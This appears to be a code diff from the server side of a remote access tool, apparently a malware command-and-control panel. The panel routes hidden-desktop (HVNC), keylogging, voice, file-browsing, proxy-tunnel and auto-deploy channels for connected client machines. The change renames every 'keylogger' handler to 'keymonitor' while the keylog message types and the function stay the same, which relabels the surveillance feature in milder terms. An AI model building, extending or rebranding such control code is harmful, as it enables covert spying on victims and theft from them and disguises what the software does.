@@ -42,7 +42,7 @@ type WsLifecycleDeps = {
   handleHVNCViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleFileBrowserViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
-  handleKeyloggerViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
+  handleKeymonitorViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleVoiceViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleNotificationViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleConsoleViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
@@ -51,7 +51,7 @@ type WsLifecycleDeps = {
   handleHVNCViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleFileBrowserViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
-  handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
+  handleKeymonitorViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
@@ -71,7 +71,7 @@ type WsLifecycleDeps = {
   handleProxyTunnelClose: (clientId: string, connectionId: string) => void;
   handleProxyConnectResult: (clientId: string, connectionId: string, ok: boolean) => void;
   handleProcessMessage: (clientId: string, payload: any) => void;
-  handleKeyloggerMessage: (clientId: string, payload: any) => void;
+  handleKeymonitorMessage: (clientId: string, payload: any) => void;
   notifyRdInputLatency: (commandId: string) => void;
   handleNotificationScreenshotFailure: (commandId: string | undefined, ok: boolean | undefined, message: string | undefined) => void;
   handlePluginEvent: (clientId: string, payload: any) => void;
@@ -148,7 +148,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "hvnc_viewer") return deps.handleHVNCViewerOpen(ws);
   if (role === "file_browser_viewer") return deps.handleFileBrowserViewerOpen(ws);
   if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
-  if (role === "keylogger_viewer") return deps.handleKeyloggerViewerOpen(ws);
+  if (role === "keymonitor_viewer") return deps.handleKeymonitorViewerOpen(ws);
   if (role === "voice_viewer") return deps.handleVoiceViewerOpen(ws);
   if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);
 
@@ -197,7 +197,7 @@ export async function handleWebSocketMessage(
   if (socketRole === "hvnc_viewer") return deps.handleHVNCViewerMessage(ws, message);
   if (socketRole === "file_browser_viewer") return deps.handleFileBrowserViewerMessage(ws, message);
   if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
-  if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
+  if (socketRole === "keymonitor_viewer") return deps.handleKeymonitorViewerMessage(ws, message);
   if (socketRole === "voice_viewer") return deps.handleVoiceViewerMessage(ws, message);
   if (socketRole === "notifications_viewer") return;
   if (socketRole === "dashboard_viewer") return;
@@ -514,7 +514,7 @@ export async function handleWebSocketMessage(
       case "keylog_file_content":
       case "keylog_clear_result":
       case "keylog_delete_result":
-        deps.handleKeyloggerMessage(client.id, payload);
+        deps.handleKeymonitorMessage(client.id, payload);
         break;
       case "script_result": {
         logger.debug(
@@ -685,9 +685,9 @@ export function handleWebSocketClose(
     return;
   }
 
-  if (role === "keylogger_viewer") {
+  if (role === "keymonitor_viewer") {
     if (sessionId) {
-      sessionManager.deleteKeyloggerSession(sessionId);
+      sessionManager.deleteKeymonitorSession(sessionId);
     }
     return;
   }
